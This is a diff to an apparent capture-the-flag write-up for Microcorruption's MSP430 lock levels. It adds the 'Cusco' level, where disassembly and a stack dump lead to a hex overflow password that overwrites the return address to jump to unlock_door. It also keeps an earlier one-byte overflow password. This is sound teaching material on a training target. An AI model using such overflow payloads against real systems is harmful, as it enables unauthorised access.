@@ -88,4 +88,54 @@ Instead of of using the lock itself to test the entered password, here Hardware 
 4574:  b012 de45      call  #0x45de <puts>
 4578:  3041           ret
 ```
-Although the user is prompt to enter a password of up to 16 bytes there is no input checking. Therefore, by entering a 17 chars password with the last one set to `0x2d` it is possible to overwrite memory address `0x2410` and trick the program. A good password is thus: `414141414141414141414141414141412d`
+Although the user is prompt to enter a password of up to 16 bytes there is no input checking. Therefore, by entering a 17 chars password with the last one set to `0x2d` it is possible to overwrite memory address `0x2410` and trick the program. A good password is thus: `414141414141414141414141414141412d`.
+
+Level 4: Cusco
+--------------
+This one is a classic [stack smashing](http://en.wikipedia.org/wiki/Stack_buffer_overflow) level. I won't get into the whole "how the stack works" since there are [great](http://duartes.org/gustavo/blog/post/journey-to-the-stack/) [resources](http://duartes.org/gustavo/blog/post/epilogues-canaries-buffer-overflows/) covering it already, but only explain the general idea bellow. The `login` subroutine does the following:
+
+1. Read up to `0x30` chars from the user into the stack.
+2. Test whether the entered password is valid by sending the password location as an argument to `test_password_valid`.
+3. Unlock the door via `unlock_door` if the password is valid.
+
+```
+4500 <login>
+4500:  3150 f0ff      add   #0xfff0, sp
+4504:  3f40 7c44      mov   #0x447c "Enter the password to continue.", r15
+4508:  b012 a645      call  #0x45a6 <puts>
+450c:  3f40 9c44      mov   #0x449c "Remember: passwords are between 8 and 16 characters.", r15
+4510:  b012 a645      call  #0x45a6 <puts>
+4514:  3e40 3000      mov   #0x30, r14
+4518:  0f41           mov   sp, r15
+451a:  b012 9645      call  #0x4596 <getsn>
+451e:  0f41           mov   sp, r15
+4520:  b012 5244      call  #0x4452 <test_password_valid>
+4524:  0f93           tst   r15
+4526:  0524           jz    #0x4532 <login+0x32>
+4528:  b012 4644      call  #0x4446 <unlock_door>
+452c:  3f40 d144      mov   #0x44d1 "Access granted.", r15
+4530:  023c           jmp   #0x4536 <login+0x36>
+4532:  3f40 e144      mov   #0x44e1 "That password is not correct.", r15
+4536:  b012 a645      call  #0x45a6 <puts>
+453a:  3150 1000      add   #0x10, sp
+453e:  3041           ret
+```
+
+The user is prompt to enter a password between 8 and 16 chars (although, as you have probably noticed, it is not forced). Entering `idosch1234`, putting a breakpoint at `0x453e` (just before `login` returns) and examining the stack we see the following (the stack pointer points to `0x43fe`):
+
+```
+break 453e
+```
+
+```
+43d0:   0000 0000 0000 0000 0000 0000 5645 0100   ............VE..
+43e0:   5645 0300 ca45 0000 0a00 0000 3a45 6964   VE...E......:Eid
+43f0:   6f73 6368 3132 3334 0000 0000 0000 3c44   osch1234.......D
+```
+
+Visible are:
+
+1. Leftovers from previous [stack frames](http://en.wikipedia.org/wiki/Call_stack) (in lower addresses).
+2. The entered password in the current stack frame and the address to return to after the `login` subroutine ends: `0x443c`.
+
+By entering a 18 bytes password we can effectively take control of the program execution and make it return to wherever we want. A good place is the `unlock_door` subroutine located at memory address `0x4446`. Entering the password `414141414141414141414141414141414644` does the trick.
